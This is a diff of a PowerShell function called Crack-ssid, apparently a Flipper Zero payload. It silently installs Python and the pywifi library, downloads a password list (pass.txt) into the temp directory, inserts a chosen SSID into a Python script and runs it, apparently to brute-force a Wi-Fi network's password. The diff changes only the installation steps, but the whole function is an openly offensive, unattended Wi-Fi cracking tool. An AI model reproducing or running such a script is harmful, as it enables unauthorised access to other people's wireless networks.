@@ -3,28 +3,19 @@ function Crack-ssid {
         [string]$ssid
     )
 
-    # Download and install Python
-    $pythonInstallerUrl = 'https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe'
-    $pythonInstallerPath = "$env:TEMP\python-installer.exe"
-    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath -UseBasicParsing
-    Start-Process -FilePath $pythonInstallerPath -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
-    Remove-Item -Path $pythonInstallerPath -Force
+    # Download Python installer
+    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
+    $pythonInstallerPath = "$env:TEMP\python_installer.exe"
+    Download-File -url $pythonInstallerUrl -outputPath $pythonInstallerPath
 
-    # Download and install pip
-    $getPipUrl = 'https://bootstrap.pypa.io/get-pip.py'
-    $getPipPath = "$env:TEMP\get-pip.py"
-    Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
-    python $getPipPath
-    Remove-Item -Path $getPipPath -Force
+    # Install Python
+    Start-Process -Wait -FilePath $pythonInstallerPath -ArgumentList "/quiet", "PrependPath=1"
 
-    # Check if comtypes is installed
-    $comtypesInstalled = Get-Command python -ErrorAction SilentlyContinue | ForEach-Object { $_.ModuleName } | Where-Object { $_ -eq 'comtypes' }
-    if (-not $comtypesInstalled) {
-        # Install comtypes
-        pip install comtypes
-    }
+    # Install pip
+    python -m ensurepip
 
-    # Install pywifi
+    
+    pip install comtypes
     pip install pywifi
 
     # Download pass.txt from the URL and save it to the user's temp directory
@@ -41,7 +32,7 @@ function Crack-ssid {
     (Get-Content $flipperFilePath) -replace 'YOUR_SSID_HERE', $ssid | Set-Content $flipperFilePath
 
     # Run the Python script with the updated SSID
-    python3 $flipperFilePath
+    python $flipperFilePath
 }
 
 # Crack-ssid -ssid "YOUR_SSID_HERE"
